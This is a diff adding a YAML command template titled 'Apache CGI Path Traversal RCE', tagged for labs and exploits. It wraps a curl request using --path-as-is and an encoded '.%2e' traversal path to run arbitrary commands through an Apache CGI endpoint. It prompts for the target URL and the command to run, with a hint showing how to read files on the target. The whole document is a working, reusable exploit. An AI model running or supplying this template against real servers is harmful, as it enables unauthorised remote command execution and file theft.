@@ -1,0 +1,17 @@
+name: Apache CGI Path Traversal RCE
+description: Send a command to a CGI shell through an Apache path traversal vulnerability.
+tags: [labs, exploit, http]
+shell: "curl --path-as-is -s -X POST --data-binary {{command}} {{url}}"
+inputs:
+  - id: url
+    prompt: "CGI shell URL with encoded traversal"
+    type: string
+    required: true
+    secret: false
+    validation_hint: "full URL including the .%2e traversal path and port"
+  - id: command
+    prompt: "Command to run via CGI"
+    type: string
+    required: true
+    secret: false
+    validation_hint: "no spaces allowed; use shell redirection instead, e.g. cat</path/to/file"
